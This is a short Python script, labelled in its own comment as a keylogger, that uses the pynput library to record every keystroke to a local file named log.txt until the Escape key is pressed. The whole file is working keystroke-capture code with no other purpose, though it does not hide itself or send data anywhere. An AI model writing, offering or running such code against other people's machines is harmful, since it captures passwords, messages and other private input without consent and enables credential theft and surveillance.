#This is keylogger
from pynput.keyboard import Key, Listener

def on_press(key):
    with open("log.txt", "a") as f:
        try:
            f.write(f'{key.char}\n')
        except AttributeError:
            f.write(f'{key}\n')

def on_release(key):
    if key == Key.esc:
        return False  # Stop listener

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

